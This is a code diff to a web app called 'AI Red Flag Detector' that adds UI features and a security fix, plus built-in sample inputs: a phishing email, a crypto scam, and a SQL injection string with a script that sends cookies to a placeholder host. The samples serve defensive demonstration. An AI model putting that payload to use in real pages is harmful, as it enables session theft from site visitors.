@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AI Red Flag Detector</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+Devanagari:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -16,8 +16,10 @@
     --ink-soft: #5C6D66;
     --ink-faint: #8B9C95;
     --brand: #0E7C6B;
+    --brand-2: #17A98C;
     --brand-dark: #0A5E51;
     --brand-light: #E3F4EF;
+    --brand-grad: linear-gradient(135deg, #0E7C6B, #17A98C);
     --safe: #1F9D64;
     --safe-light: #E7F8EE;
     --caution: #D98A1F;
@@ -75,7 +77,7 @@
 
   .hero{ text-align:center; padding:22px 0 34px; }
   h1{ font-family:'Sora', sans-serif; font-weight:800; font-size:clamp(30px, 5vw, 46px); line-height:1.1; letter-spacing:-0.02em; margin:0 0 14px; color:var(--ink); }
-  h1 .accent{ color:var(--brand); }
+  h1 .accent{ background:var(--brand-grad); -webkit-background-clip:text; background-clip:text; color:transparent; }
   .subhead{ font-size:16px; color:var(--ink-soft); max-width:560px; margin:0 auto; line-height:1.6; }
 
   .card{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:24px; }
@@ -103,12 +105,12 @@
 
   .analyze-btn{
     margin-top:16px; width:100%; font-family:'Sora', sans-serif; font-size:16px; font-weight:700; letter-spacing:-0.005em;
-    background:var(--brand); color:#fff; border:none; border-radius:var(--radius-sm); padding:16px; cursor:pointer;
+    background:var(--brand-grad); color:#fff; border:none; border-radius:var(--radius-sm); padding:16px; cursor:pointer;
     display:flex; align-items:center; justify-content:center; gap:9px;
-    transition:transform .1s ease, background .15s ease, box-shadow .15s ease;
+    transition:transform .1s ease, filter .15s ease, box-shadow .15s ease;
     box-shadow:0 6px 16px rgba(14,124,107,0.28);
   }
-  .analyze-btn:hover:not(:disabled){ background:var(--brand-dark); box-shadow:0 8px 20px rgba(14,124,107,0.34); }
+  .analyze-btn:hover:not(:disabled){ filter:brightness(1.06); box-shadow:0 10px 22px rgba(14,124,107,0.36); }
   .analyze-btn:active:not(:disabled){ transform:scale(0.985); }
   .analyze-btn:disabled{ opacity:0.65; cursor:not-allowed; transform:none; }
   .analyze-btn svg{ flex:none; }
@@ -126,8 +128,13 @@
   .reveal{ animation:riseIn .45s cubic-bezier(.22,1,.36,1) both; }
   .reveal-1{ animation-delay:.02s; } .reveal-2{ animation-delay:.08s; } .reveal-3{ animation-delay:.14s; } .reveal-4{ animation-delay:.20s; }
 
-  .verdict-card{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:26px; text-align:center; }
+  .verdict-card{ position:relative; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:26px; text-align:center; overflow:hidden; }
   @media (max-width:600px){ .verdict-card{ padding:20px 16px; } }
+  .verdict-card::before{ content:""; position:absolute; top:0; left:0; right:0; height:4px; background:var(--border); }
+  .verdict-card.tier-safe::before{ background:linear-gradient(90deg, var(--safe), #57C98A); }
+  .verdict-card.tier-caution::before{ background:linear-gradient(90deg, var(--caution), #F0B152); }
+  .verdict-card.tier-flagged::before{ background:linear-gradient(90deg, var(--danger), #E87979); }
+  .verdict-card.tier-pending::before{ background:var(--brand-grad); }
 
   .verdict-icon-wrap{ width:76px; height:76px; margin:0 auto 14px; border-radius:50%; display:flex; align-items:center; justify-content:center; transition:background .3s ease; }
   .verdict-icon-wrap.safe{ background:var(--safe-light); color:var(--safe); }
@@ -203,6 +210,43 @@
   .no-findings{ font-size:13.5px; color:var(--ink-soft); background:var(--safe-light); border-radius:var(--radius-sm); padding:14px; line-height:1.6; }
   .no-findings.has-ai-flag{ background:var(--caution-light); }
 
+  /* Category risk-breakdown bar chart */
+  .chart-bars{ display:flex; flex-direction:column; gap:10px; margin:2px 0 18px; }
+  .chart-bar-row{ display:flex; align-items:center; gap:10px; }
+  .chart-bar-label{ width:118px; flex:none; font-size:12px; font-weight:600; color:var(--ink-soft); text-align:right; line-height:1.3; }
+  .chart-bar-track{ flex:1; height:11px; background:var(--surface-soft); border-radius:6px; overflow:hidden; position:relative; }
+  .chart-bar-fill{ height:100%; width:0%; border-radius:6px; transition:width 1s cubic-bezier(.22,1,.36,1); }
+  .chart-bar-fill.sev-high{ background:linear-gradient(90deg, var(--danger), #E87979); }
+  .chart-bar-fill.sev-mixed{ background:linear-gradient(90deg, var(--caution), #E87979); }
+  .chart-bar-fill.sev-med{ background:linear-gradient(90deg, var(--caution), #F0B152); }
+  .chart-bar-val{ width:20px; flex:none; text-align:left; font-family:'JetBrains Mono', monospace; font-size:11.5px; font-weight:700; color:var(--ink); }
+  .chart-bar-row{ cursor:pointer; }
+  .chart-bar-row:hover .chart-bar-label{ color:var(--ink); }
+  .chart-bar-row:hover .chart-bar-track{ box-shadow:0 0 0 1.5px var(--brand) inset; }
+
+  /* Session trend sparkline */
+  .session-strip{ display:flex; align-items:center; gap:18px; flex-wrap:wrap; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-sm); padding:14px 18px; margin-bottom:14px; }
+  .session-strip-text{ flex:1; min-width:150px; }
+  .session-strip-title{ font-family:'Sora', sans-serif; font-weight:700; font-size:13px; color:var(--ink); margin-bottom:2px; }
+  .session-strip-sub{ font-size:12px; color:var(--ink-faint); }
+  .session-spark{ flex:none; }
+  .session-spark-dot{ transition:r .2s ease; }
+
+  /* Example chips */
+  .example-chips{ display:flex; flex-wrap:wrap; gap:8px; margin:12px 0 4px; }
+  .example-chip{ font-family:'Inter', sans-serif; font-size:12px; font-weight:600; background:var(--surface-soft); border:1px solid var(--border); color:var(--ink-soft); border-radius:999px; padding:7px 13px; cursor:pointer; transition:all .15s ease; display:flex; align-items:center; gap:6px; }
+  .example-chip:hover{ border-color:var(--brand); color:var(--brand-dark); background:var(--brand-light); }
+  .example-chip svg{ flex:none; width:12px; height:12px; }
+
+  /* Copy report button */
+  .copy-report-btn{
+    margin-top:14px; font-family:'Inter', sans-serif; font-size:12.5px; font-weight:600; background:var(--surface-soft);
+    border:1px solid var(--border); color:var(--ink-soft); border-radius:999px; padding:9px 16px; cursor:pointer;
+    display:inline-flex; align-items:center; gap:7px; transition:all .15s ease;
+  }
+  .copy-report-btn:hover{ border-color:var(--brand); color:var(--brand-dark); }
+  .copy-report-btn.copied{ background:var(--safe-light); border-color:var(--safe); color:var(--safe); }
+
   .checklist-toggle{ width:100%; display:flex; align-items:center; justify-content:space-between; background:transparent; border:none; padding:18px 22px; cursor:pointer; text-align:left; }
   @media (max-width:600px){ .checklist-toggle{ padding-left:16px; padding-right:16px; } }
   .checklist-toggle:hover .section-title{ color:var(--brand); }
@@ -246,6 +290,11 @@
 
   /* Ambient background */
   #bg-canvas{ position:fixed; inset:0; width:100%; height:100%; z-index:-1; pointer-events:none; transition:opacity 1.2s ease; }
+  /* BUGFIX: fx-canvas previously had no position rule, so its JS-assigned
+     width/height (set to the full viewport size) made it a huge static
+     block element in normal document flow — this was the large blank
+     gap pushing all page content down. Pin it to the viewport like bg-canvas. */
+  #fx-canvas{ position:fixed; inset:0; width:100%; height:100%; z-index:60; pointer-events:none; }
   body.mood-safe #bg-canvas{ opacity:0.55; }
   body.mood-caution #bg-canvas{ opacity:0.7; }
   body.mood-flagged #bg-canvas{ opacity:0.85; }
@@ -407,6 +456,8 @@
       <button class="mode-tab" data-mode="code" data-i18n="modeCode">Code</button>
     </div>
 
+    <div class="example-chips" id="example-chips"></div>
+
     <div class="textarea-wrap live-highlight-wrap tilt-card" id="textarea-tilt">
       <pre class="live-highlight-mirror" id="live-mirror" aria-hidden="true"></pre>
       <textarea id="input-text" data-i18n-placeholder="placeholderAuto" placeholder="Paste a suspicious email, link, or code snippet here..." spellcheck="false" maxlength="6000"></textarea>
@@ -469,6 +520,7 @@ let currentTier = 'pending';
 let isAnalyzing = false;
 let lastState = null;
 let lastFxTier = null; // only trigger confetti/glitch once per fresh result, not on re-render
+let sessionHistory = []; // in-memory only: {score, tier} per check this session, not persisted
 
 /* ==========================================================================
    Ambient particle background
@@ -708,6 +760,17 @@ const STRINGS = {
     patternScan: "Pattern scan", aiAnalystLabel: "AI",
     confidenceLabel: "Confidence",
     disagreeNote: "Heads up: the pattern scan alone looked low-risk, but the AI's review raised the score above — its read is reflected in the verdict.",
+    tryExample: "Try an example:",
+    exPhishing: "Phishing email",
+    exCrypto: "Crypto scam",
+    exCode: "Malicious code",
+    riskByCategory: "Risk by category",
+    riskByCategorySub: "Where the risk score is coming from",
+    sessionTrendTitle: (n) => `${n} check${n>1?'s':''} this session`,
+    sessionTrendSub: "Trend only — not saved after you close this tab",
+    copyReport: "Copy report",
+    copyReportCopied: "Copied to clipboard",
+    readAloud: "Read this aloud",
   },
   hi: {
     title: "AI रेड फ़्लैग डिटेक्टर",
@@ -761,6 +824,17 @@ const STRINGS = {
     patternScan: "पैटर्न स्कैन", aiAnalystLabel: "AI",
     confidenceLabel: "विश्वास स्तर",
     disagreeNote: "ध्यान दें: अकेले पैटर्न स्कैन में जोखिम कम लगा, लेकिन AI की समीक्षा ने ऊपर स्कोर बढ़ाया है — फ़ैसले में उसकी राय भी शामिल है।",
+    tryExample: "एक उदाहरण आज़माएँ:",
+    exPhishing: "फ़िशिंग ईमेल",
+    exCrypto: "क्रिप्टो स्कैम",
+    exCode: "मैलिशियस कोड",
+    riskByCategory: "श्रेणी अनुसार जोखिम",
+    riskByCategorySub: "जोखिम स्कोर कहाँ से आ रहा है",
+    sessionTrendTitle: (n) => `इस सेशन में ${n} जाँच${n>1?'ें':''}`,
+    sessionTrendSub: "सिर्फ़ रुझान — यह टैब बंद करने पर सेव नहीं रहता",
+    copyReport: "रिपोर्ट कॉपी करें",
+    copyReportCopied: "क्लिपबोर्ड पर कॉपी हो गया",
+    readAloud: "इसे ज़ोर से पढ़ें",
   }
 };
 function t(key){ return STRINGS[currentLang][key]; }
@@ -800,6 +874,41 @@ const CAT_PHRASES = {
   }
 };
 
+const EXAMPLES = {
+  en: {
+    phishing: "Dear valued customer,\n\nYour account will be suspended within 24 hours unless you verify your password immediately.\n\nClick here to confirm your identity: http://paypa1-secure.xyz/verify",
+    crypto: "Congratulations! You've been selected to claim your prize.\n\nSend 0.5 BTC now and receive 1.5 BTC back within minutes — guaranteed returns, 100% risk-free investment. Act now, offer expires today!",
+    code: "SELECT * FROM users WHERE username='admin' OR '1'='1'; --\n\n<script>document.location='http://evil-collector.com/steal?c='+document.cookie</script>"
+  },
+  hi: {
+    phishing: "प्रिय ग्राहक,\n\nयदि आपने तुरंत अपना पासवर्ड वेरिफ़ाई नहीं किया तो 24 घंटों के भीतर आपका खाता निलंबित कर दिया जाएगा।\n\nअपनी पहचान की पुष्टि के लिए यहाँ क्लिक करें: http://paypa1-secure.xyz/verify",
+    crypto: "बधाई हो! आपको इनाम पाने के लिए चुना गया है।\n\nअभी 0.5 BTC भेजें और कुछ ही मिनटों में 1.5 BTC वापस पाएँ — गारंटीड रिटर्न, 100% जोखिम-मुक्त निवेश। अभी करें, ऑफ़र आज ही समाप्त हो रहा है!",
+    code: "SELECT * FROM users WHERE username='admin' OR '1'='1'; --\n\n<script>document.location='http://evil-collector.com/steal?c='+document.cookie</script>"
+  }
+};
+
+function renderExampleChips(){
+  const wrap = document.getElementById('example-chips');
+  if(!wrap) return;
+  const items = [
+    {key:'phishing', label: t('exPhishing')},
+    {key:'crypto', label: t('exCrypto')},
+    {key:'code', label: t('exCode')},
+  ];
+  wrap.innerHTML = `<span style="font-size:12px;color:var(--ink-faint);font-weight:600;align-self:center;">${escapeHtml(t('tryExample'))}</span>` +
+    items.map(it => `<button type="button" class="example-chip" data-ex="${it.key}">${ICONS.sparkle}${escapeHtml(it.label)}</button>`).join('');
+  wrap.querySelectorAll('.example-chip').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const ex = (EXAMPLES[currentLang] && EXAMPLES[currentLang][btn.dataset.ex]) || EXAMPLES.en[btn.dataset.ex];
+      inputText.value = ex;
+      updateCharCount();
+      renderLiveHighlight();
+      syncMirrorScroll();
+      inputText.focus();
+    });
+  });
+}
+
 function applyLanguage(lang){
   currentLang = lang;
   document.body.classList.toggle('lang-hi', lang === 'hi');
@@ -821,6 +930,7 @@ function applyLanguage(lang){
 
   const mode = document.querySelector('.mode-tab.active')?.dataset.mode || 'auto';
   setMode(mode);
+  renderExampleChips();
 
   if(lastState){
     renderVerdictArea(lastState, false);
@@ -1026,7 +1136,10 @@ function escapeHtml(s){
 
 function buildSummary(matches, aiResult){
   if(matches.length === 0 && aiResult){
-    return aiResult.reasoning;
+    // BUGFIX: this text is inserted via innerHTML and came straight from the
+    // API response, unescaped — a malicious/compromised API response could
+    // have injected markup. Escape it like every other AI-sourced string.
+    return escapeHtml(aiResult.reasoning);
   }
   if(matches.length === 0){
     return t('summarySafeNoMatches');
@@ -1058,6 +1171,73 @@ function labelForTier(tier){
   if(tier === 'flagged') return t('verdictFlagged');
   if(tier === 'pending') return t('verdictPending');
   return t('verdictCaution');
+}
+
+function recordSessionEntry(finalScore, tier){
+  sessionHistory.push({score: finalScore, tier});
+  if(sessionHistory.length > 12) sessionHistory.shift();
+}
+
+function renderSessionStrip(){
+  if(sessionHistory.length < 2) return '';
+  const w = 150, h = 42, pad = 6;
+  const n = sessionHistory.length;
+  const stepX = (w - pad*2) / (n-1);
+  const colorFor = (tier) => tier==='safe' ? 'var(--safe)' : tier==='flagged' ? 'var(--danger)' : 'var(--caution)';
+  const pts = sessionHistory.map((e,i) => ({
+    x: pad + i*stepX, y: pad + (1 - e.score/100) * (h - pad*2), e
+  }));
+  const linePts = pts.map(p => `${p.x.toFixed(1)},${p.y.toFixed(1)}`).join(' ');
+  const dots = pts.map(p => `<circle class="session-spark-dot" cx="${p.x.toFixed(1)}" cy="${p.y.toFixed(1)}" r="3" fill="${colorFor(p.e.tier)}"/>`).join('');
+  return `
+    <div class="session-strip reveal">
+      <svg class="session-spark" width="${w}" height="${h}" viewBox="0 0 ${w} ${h}" aria-hidden="true">
+        <polyline points="${linePts}" fill="none" stroke="var(--brand)" stroke-width="1.6" stroke-linejoin="round" stroke-linecap="round" opacity="0.5"/>
+        ${dots}
+      </svg>
+      <div class="session-strip-text">
+        <div class="session-strip-title">${escapeHtml(t('sessionTrendTitle')(sessionHistory.length))}</div>
+        <div class="session-strip-sub">${escapeHtml(t('sessionTrendSub'))}</div>
+      </div>
+    </div>`;
+}
+
+function renderCategoryChart(matches){
+  if(matches.length === 0) return '';
+  const catScores = {};
+  matches.forEach(m => { catScores[m.cat] = (catScores[m.cat]||0) + (m.sev === 'high' ? 22 : 11); });
+  const cats = CAT_ORDER.filter(c => catScores[c]);
+  if(cats.length === 0) return '';
+  const maxScore = Math.max(...cats.map(c => catScores[c]));
+  const rows = cats.map(c => {
+    const val = catScores[c];
+    const pct = Math.max(6, Math.round((val / maxScore) * 100));
+    const hasHigh = matches.some(m => m.cat === c && m.sev === 'high');
+    return `
+      <div class="chart-bar-row" data-cat="${c}" tabindex="0" role="button">
+        <div class="chart-bar-label">${escapeHtml(CAT_NAMES[currentLang][c])}</div>
+        <div class="chart-bar-track"><div class="chart-bar-fill ${hasHigh ? 'sev-high' : 'sev-med'}" data-target="${pct}"></div></div>
+        <div class="chart-bar-val">${val}</div>
+      </div>`;
+  }).join('');
+  return `<div class="chart-bars" id="category-chart">${rows}</div>`;
+}
+
+function buildPlainReport(state){
+  const aiScore = state.aiResult ? state.aiResult.risk_score : null;
+  const finalScore = aiScore !== null ? Math.max(state.heuristicScore, aiScore) : state.heuristicScore;
+  const tier = verdictTier(finalScore);
+  const lines = [`${t('title')} — ${labelForTier(tier)} (${finalScore}/100)`, ''];
+  lines.push(buildSummary(currentMatches, state.aiResult).replace(/<[^>]+>/g,''));
+  if(currentMatches.length){
+    lines.push('', t('whatWeFound') + ':');
+    currentMatches.forEach(m => lines.push(`- [${m.sev.toUpperCase()}] ${m.label}: "${m.text}"`));
+  }
+  if(state.aiResult){
+    lines.push('', `${t('aiTake')} (${state.aiResult.risk_score}/100): ${state.aiResult.reasoning}`);
+  }
+  lines.push('', '#SNEMANYU');
+  return lines.join('\n');
 }
 
 function scoreRing(score, tier){
@@ -1134,7 +1314,7 @@ function renderVerdictArea(state, isFreshResult){
 
   if(state.status === 'pending'){
     wrap.innerHTML = `
-    <div class="verdict-card reveal reveal-1">
+    <div class="verdict-card tier-pending reveal reveal-1">
       <div class="verdict-icon-wrap pending">${iconForTier('pending')}</div>
       <div class="verdict-label pending">${t('verdictPending')}</div>
     </div>
@@ -1170,7 +1350,8 @@ function renderVerdictArea(state, isFreshResult){
   const closingLine = tier === 'safe' ? n.verdictSafe : tier === 'flagged' ? n.verdictFlagged : n.verdictCaution;
 
   wrap.innerHTML = `
-    <div class="verdict-card reveal reveal-1 tilt-card">
+    ${renderSessionStrip()}
+    <div class="verdict-card tier-${tier} reveal reveal-1 tilt-card">
       <div class="verdict-icon-wrap ${tier} animate-pop">${iconForTier(tier)}</div>
       <div class="verdict-label ${tier}">${labelForTier(tier)}</div>
       <p class="verdict-summary">${buildSummary(currentMatches, state.aiResult)}</p>
@@ -1183,12 +1364,15 @@ function renderVerdictArea(state, isFreshResult){
       </div>
       ${disagreement ? `<div class="disagree-note">${t('disagreeNote')}</div>` : ''}
       ${errorHtml}
+      <button class="copy-report-btn" id="copy-report-btn" type="button">
+        ${ICONS.clipboard}<span class="copy-label">${t('copyReport')}</span>
+      </button>
     </div>
     <div class="assistant-bubble reveal reveal-2">
       <div class="assistant-avatar">${AI_FACE_ICONS[tier] || AI_FACE_ICONS.caution}</div>
       <div class="assistant-text" style="display:flex; align-items:center; justify-content:space-between; gap:10px;">
         <p class="assistant-line" style="margin:0;">${escapeHtml(closingLine)}</p>
-        <button class="voice-btn" id="voice-btn" title="Read this aloud" aria-label="Read this aloud" style="flex:none; width:34px; height:34px; border-radius:50%; border:1px solid var(--border); background:var(--surface); color:var(--brand); cursor:pointer; display:flex; align-items:center; justify-content:center;">
+        <button class="voice-btn" id="voice-btn" title="${escapeHtml(t('readAloud'))}" aria-label="${escapeHtml(t('readAloud'))}" style="flex:none; width:34px; height:34px; border-radius:50%; border:1px solid var(--border); background:var(--surface); color:var(--brand); cursor:pointer; display:flex; align-items:center; justify-content:center; transition:background .15s ease;">
           <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2 6 H4.5 L8 3 V13 L4.5 10 H2 Z" fill="currentColor"/><path d="M10.5 5 C11.5 6 11.5 10 10.5 11" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
         </button>
       </div>
@@ -1204,6 +1388,21 @@ function renderVerdictArea(state, isFreshResult){
 
   if(state.aiError){
     document.getElementById('retry-ai-btn').addEventListener('click', retryAi);
+  }
+
+  const copyBtn = document.getElementById('copy-report-btn');
+  if(copyBtn){
+    copyBtn.addEventListener('click', async () => {
+      try{
+        await navigator.clipboard.writeText(buildPlainReport(state));
+        copyBtn.classList.add('copied');
+        copyBtn.querySelector('.copy-label').textContent = t('copyReportCopied');
+        setTimeout(() => {
+          copyBtn.classList.remove('copied');
+          copyBtn.querySelector('.copy-label').textContent = t('copyReport');
+        }, 1800);
+      } catch(e){ /* clipboard unavailable — silently no-op */ }
+    });
   }
 
   const voiceBtn = document.getElementById('voice-btn');
@@ -1250,7 +1449,7 @@ function renderRestSections(state){
     findingsInner = `<p class="no-findings${aiFlaggedDespiteNoMatches ? ' has-ai-flag' : ''}">${aiFlaggedDespiteNoMatches ? t('nothingFoundButAiFlagged') : t('nothingFound')}</p>`;
   } else {
     findingsInner = `<div class="findings-list">` + currentMatches.map(m => `
-      <div class="finding sev-${m.sev==='high'?'high':'med'}">
+      <div class="finding sev-${m.sev==='high'?'high':'med'}" data-cat="${m.cat}">
         <div class="finding-icon">${m.sev==='high' ? ICONS.x : ICONS.check}</div>
         <div>
           <div class="finding-cat">${CAT_NAMES[currentLang][m.cat]}</div>
@@ -1259,12 +1458,16 @@ function renderRestSections(state){
       </div>
     `).join('') + `</div>`;
   }
+  const catChartHtml = currentMatches.length ? `
+      <div class="section-title" style="font-size:12.5px; margin-bottom:2px;">${t('riskByCategory')}</div>
+      <div class="section-sub" style="margin-bottom:10px;">${t('riskByCategorySub')}</div>
+      ${renderCategoryChart(currentMatches)}` : '';
   const findingsSection = `
     <div class="section reveal reveal-3">
       <div class="section-head">${ICONS.magnify}
         <div><div class="section-title">${t('whatWeFound')}</div><div class="section-sub">${currentMatches.length ? t('whatWeFoundSub')(currentMatches.length) : ''}</div></div>
       </div>
-      <div class="section-body">${findingsInner}</div>
+      <div class="section-body">${catChartHtml}${findingsInner}</div>
     </div>`;
 
   let aiInner;
@@ -1332,6 +1535,23 @@ function renderRestSections(state){
   toggleBtn.addEventListener('click', () => {
     const open = panel.classList.toggle('open');
     toggleBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
+  });
+
+  requestAnimationFrame(() => {
+    wrap.querySelectorAll('.chart-bar-fill').forEach(fill => {
+      requestAnimationFrame(() => { fill.style.width = fill.dataset.target + '%'; });
+    });
+  });
+  wrap.querySelectorAll('.chart-bar-row').forEach(row => {
+    const jumpToCategory = () => {
+      const target = wrap.querySelector(`.finding[data-cat="${row.dataset.cat}"]`);
+      if(!target) return;
+      target.scrollIntoView({behavior:'smooth', block:'center'});
+      target.style.boxShadow = '0 0 0 2px var(--brand)';
+      setTimeout(() => { target.style.boxShadow = ''; }, 1000);
+    };
+    row.addEventListener('click', jumpToCategory);
+    row.addEventListener('keydown', (e) => { if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); jumpToCategory(); } });
   });
 }
 
@@ -1576,6 +1796,11 @@ async function runAiPass(isFreshResult){
     lastState = {status:'done', heuristicScore: currentHeuristicScore, aiResult};
   } catch(err){
     lastState = {status:'done', heuristicScore: currentHeuristicScore, aiError: err.message};
+  }
+  if(isFreshResult){
+    const aiScore = lastState.aiResult ? lastState.aiResult.risk_score : null;
+    const finalScore = aiScore !== null ? Math.max(lastState.heuristicScore, aiScore) : lastState.heuristicScore;
+    recordSessionEntry(finalScore, verdictTier(finalScore));
   }
   renderVerdictArea(lastState, isFreshResult);
 }
